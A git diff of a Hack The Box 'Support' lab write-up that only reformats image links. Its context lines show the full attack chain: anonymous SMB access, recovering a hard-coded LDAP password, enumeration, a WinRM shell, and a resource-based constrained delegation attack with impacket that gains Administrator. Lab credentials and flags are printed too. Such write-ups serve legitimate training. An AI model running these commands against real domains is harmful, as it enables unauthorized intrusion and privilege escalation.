@@ -30,7 +30,7 @@ Started with a detailed service and version scan:
 sudo nmap -T4 -sV -A -Pn 10.129.27.67
 ```
 
-![[nmap2.png]]
+![](images/nmap2.png)
 
 The scan immediately identified this as a Domain Controller. Key ports:
 
@@ -69,7 +69,7 @@ Listed available SMB shares with no credentials:
 smbclient -L //support.htb
 ```
 
-![[smb shares.png]]
+![](images/smb shares.png)
 
 The share list revealed a non-standard share: `support-tools`. Everything else (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) is default. `support-tools` with the description "support staff tools" is interesting — accessed it anonymously:
 
@@ -77,7 +77,7 @@ The share list revealed a non-standard share: `support-tools`. Everything else (
 smbclient //10.129.27.67/support-tools
 ```
 
-![][./images/smb anonymous access.png]
+![](images/smb anonymous access.png)
 
 Anonymous read access worked. The share contained several portable utilities and one file that stands out immediately:
 
@@ -94,7 +94,7 @@ smbclient //10.129.27.67/support-tools -t 120
 smb: \> get UserInfo.exe.zip
 ```
 
-![[got a file.png]]
+![](images/got a file.png)
 
 File downloaded successfully. Unzipped to find a .NET executable with its dependencies and config.
 
@@ -110,7 +110,7 @@ File downloaded successfully. Unzipped to find a .NET executable with its depend
 monodis UserInfo.exe > userinfo.il
 ```
 
-![[decompling exe file to .il file.png]]
+![](images/decompling exe file to .il file.png)
 
 ### Finding the Encrypted Password
 
@@ -120,7 +120,7 @@ Grepped the IL output for anything related to the password handling:
 grep -A5 -B5 "enc_password" userinfo.il
 ```
 
-![[pass with encrypted base64.png]]
+![](images/pass with encrypted base64.png)
 
 The IL revealed everything needed:
 
@@ -135,7 +135,7 @@ Also found the LDAP connection details:
 grep -A5 -B5 "ldap" userinfo.il
 ```
 
-![[username ldap.png]]
+![](images/username ldap.png)
 
 ```
 LDAP://support.htb   ← server
@@ -152,7 +152,7 @@ Also checked if any useful strings could be pulled directly:
 grep -A5 -B5 "enc_password" userinfo.il
 ```
 
-![[extracting any text called password.png]]
+![](images/extracting any text called password.png)
 
 Then decrypted it with Python:
 
@@ -170,7 +170,7 @@ decrypted = bytes(
 print(decrypted.decode())
 ```
 
-![[decrypted.png]]
+![](images/decrypted.png)
 
 ```
 ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
@@ -188,7 +188,7 @@ Verified the credentials work against SMB using netexec. The IP kept changing be
 nxc smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 ```
 
-![[identified creds are valid.png]]
+![](images/identified creds are valid.png)
 
 `[+]` confirmed — credentials are valid against the domain. Tried WinRM with the `ldap` account immediately but it failed — this is a service account, not a user with remote management access:
 
@@ -197,7 +197,7 @@ evil-winrm -i 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 ```
 
 
-![[evilwinrm no login.png]]
+![](images/evilwinrm no login.png)
 
 Expected. The `ldap` account is only used for LDAP binds, not interactive logon. Need to find a real user. Moved to LDAP enumeration.
 
@@ -218,7 +218,7 @@ ldapsearch -x -H ldap://10.129.230.181 \
   sAMAccountName description info comment
 ```
 
-![[found all users in dc by using ldapsearch.png]]
+![](images/found all users in dc by using ldapsearch.png)
 
 ### Extracting a Clean User List
 
@@ -233,7 +233,7 @@ ldapsearch -x -H ldap://10.129.230.181 \
   sAMAccountName | grep sAMAccountName
 ```
 
-![[ldapsearch get only usernames of samaAccounts.png]]
+![](images/ldapsearch get only usernames of samaAccounts.png)
 
 Cleaned the output with awk:
 
@@ -247,7 +247,7 @@ awk '{print $2}' validusers.txt > users.txt
 
 The full ldapsearch output exposed something critical in the `support` user's entry:
 
-![[creds of support user found in field info.png]]
+![](images/creds of support user found in field info.png)
 
 
 ```
@@ -272,7 +272,7 @@ Tried AS-REP roasting against the user list — checked if any account had pre-a
 impacket-GetNPUsers -dc-ip 10.129.230.181 support.htb/ldap -no-pass
 ```
 
-![[arp-roasting no.png]]
+![](images/arp-roasting no.png)
 
 No accounts vulnerable. Tried Kerberoasting next — checked for accounts with SPNs:
 
@@ -281,7 +281,7 @@ impacket-GetUserSPNs -request -dc-ip 10.129.230.181 support.htb/ldap:'nvEfEK16^1
 ```
 
 
-![[kerboasting no entries.png]]
+![](images/kerboasting no entries.png)
 
 No entries found. Both standard Kerberos attacks were dead ends — the password in the `info` field was the intended path.
 
@@ -295,12 +295,12 @@ Tested the `support` credentials against WinRM:
 evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
 ```
 
-![[got shell with support.png]]
+![](images/got shell with support.png)
 
 
 Shell landed as `support\support`. Retrieved the user flag from the Desktop:
 
-![[stager/writeups/write-ups/support/user flag.png]]
+![](images/user flag.png)
 
 ```
 user.txt: 5779cbe2d06a1bf7797f612e2973b6c7
@@ -341,7 +341,7 @@ cd ~/.config/bloodhound
 docker compose start
 ```
 
-![[started bloodhound.png]]
+![](images/started bloodhound.png)
 
 ### Collecting AD Data
 Ran bloodhound-python with the `ldap` credentials to collect all domain data:
@@ -352,7 +352,7 @@ bloodhound-python -c ALL -u ldap \
   -d support.htb -ns 10.129.27.67
 ```
 
-![[run bloodhound.png]]
+![](images/run bloodhound.png)
 
 
 Found 21 users, 53 groups, 1 computer, 2 GPOs. DCE/RPC warnings are expected — the data we need was collected via LDAP. Uploaded all JSON files to the BloodHound UI.
@@ -361,7 +361,7 @@ Found 21 users, 53 groups, 1 computer, 2 GPOs. DCE/RPC warnings are expected —
 
 In BloodHound searched for `Shared Support Accounts` and used pathfinding to `DC.SUPPORT.HTB`:
 
-![[genericall.png]]
+![](images/genericall.png)
 
 **GenericAll** — the `Shared Support Accounts` group has full control over the `DC.SUPPORT.HTB` computer object. Since `support` is a member of this group, we inherit this right. GenericAll on a computer object enables Resource-Based Constrained Delegation (RBCD).
 
@@ -381,7 +381,7 @@ impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
 ```
 
 
-![[create fake computer.png]]
+![](images/create fake computer.png)
 
 
 `FAKE$` machine account created successfully with password `FakePass123!`.
@@ -399,7 +399,7 @@ impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
 ```
 
 
-![[tell dc to trust fake computer.png]]
+![](images/tell dc to trust fake computer.png)
 
 `Delegation rights modified successfully` — `FAKE$` can now impersonate any user on the DC via S4U2Proxy.
 
@@ -415,7 +415,7 @@ impacket-getST support.htb/'FAKE$':'FakePass123!' \
 ```
 
 
-![[get TGT.png]]
+![](images/get TGT.png)
 
 Ticket saved as `Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`.
 
@@ -428,7 +428,7 @@ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
 impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
 ```
 
-![[got root.png]]
+![](images/got root.png)
 
 
 ```
@@ -448,7 +448,7 @@ root.txt: 6f7cc60a6e13b738c292ec507178fbe0
 
 ## Proof
 
-![][images/finished.png]
+![](images/finished.png)
 
 **Rank: #10343 | Pwned: 15 Apr 2026 | Machine State: Retired**
 
